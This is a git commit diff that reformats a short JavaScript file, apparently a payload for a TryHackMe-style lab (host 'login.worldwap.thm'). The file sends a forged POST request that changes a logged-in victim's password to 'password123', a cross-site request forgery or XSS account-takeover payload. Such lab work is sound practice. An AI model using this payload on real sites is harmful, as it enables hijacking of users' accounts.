dca165f5b037f86900c0c4819734b421702c842a
ispomael <ispomael@gmail.com>
2025-10-17 12:08:49 +0200

    Update a.js

--- a.js
+++ a.js
@@ -1,10 +1,5 @@
 var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
-        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                alert("Action executed!");
-            }
-        };
-        xhr.send('new_password=password123');
+xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
+xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('new_password=password123');
